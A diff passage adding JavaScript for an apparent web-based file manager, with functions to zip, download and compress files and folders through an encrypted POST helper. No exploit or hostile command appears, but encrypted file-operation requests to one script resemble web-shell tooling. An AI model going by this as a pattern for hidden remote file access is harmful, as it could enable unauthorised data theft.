+					document.body.appendChild(zipContainer);
+				}
+				
+				zipContainer.innerHTML = html;
+				zipContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing zip file:', error);
+			}
+		}
+
+		async function confirmZipFile(filename) {
+			const zipFileName = document.getElementById('zipFileName').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('path');
+
+			let data = {
+				'op': 'zipfile',
+				'filename': filename,
+				'zipname': zipFileName,
+				'confirm': '1'
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('File compressed successfully! ZIP file created: ' + result.zipfile);
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'File compression failed'));
+				}
+			} catch (error) {
+				console.error('Error confirming zip file:', error);
+			}
+		}
+
+		async function downloadFile(filename) {
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('path');
+
+			let data = {
+				'op': 'downloadfile',
+				'filename': filename
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				
+				// 創建下載鏈接
+				const blob = await response.blob();
+				const url = window.URL.createObjectURL(blob);
+				const a = document.createElement('a');
+				a.href = url;
+				a.download = filename;
+				document.body.appendChild(a);
+				a.click();
+				window.URL.revokeObjectURL(url);
+				document.body.removeChild(a);
+			} catch (error) {
+				console.error('Error downloading file:', error);
+				alert('Download failed!');
+			}
+		}
+
+		async function downloadFolder(foldername) {
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('path');
+
+			let data = {
+				'op': 'downloadfolder',
+				'foldername': foldername
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				
+				// 創建下載鏈接
+				const blob = await response.blob();
+				const url = window.URL.createObjectURL(blob);
+				const a = document.createElement('a');
+				a.href = url;
+				a.download = foldername + '.zip';
+				document.body.appendChild(a);
+				a.click();
+				window.URL.revokeObjectURL(url);
+				document.body.removeChild(a);
+			} catch (error) {
+				console.error('Error downloading folder:', error);
+				alert('Download failed!');
+			}
+		}
+
+		async function showZipFolder(foldername) {
+			hideAllInterfaces();
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('path');
+
+			let data = {
+				'op': 'zipfolder',
+				'foldername': foldername
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const html = await response.text();
+				
+				let zipContainer = document.getElementById('zipFolderContainer');
+				if (!zipContainer) {
+					zipContainer = document.createElement('div');
+					zipContainer.id = 'zipFolderContainer';
+					zipContainer.className = 'dialog-container';
+					document.body.appendChild(zipContainer);
+				}
+				
+				zipContainer.innerHTML = html;
+				zipContainer.style.display = 'block';
+			} catch (error) {
+				console.error('Error showing zip folder:', error);
+			}
+		}
+
+		async function confirmZipFolder(foldername) {
+			const zipFileName = document.getElementById('zipFileName').value;
+			const urlParams = new URLSearchParams(window.location.search);
+			const path = urlParams.get('path');
+
+			let data = {
+				'op': 'zipfolder',
+				'foldername': foldername,
+				'zipname': zipFileName,
+				'confirm': '1'
+			};
+			if (path) {
+				data['path'] = path;
+			}
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.json();
+				
+				if (result.success) {
+					alert('Folder compressed successfully! ZIP file created: ' + result.zipfile);
+					location.reload();
+				} else {
+					alert('Error: ' + (result.error || 'Folder compression failed'));
+				}
+			} catch (error) {
+				console.error('Error confirming zip folder:', error);
+			}
+		}
+	</script>
 
 </body>
 </html>
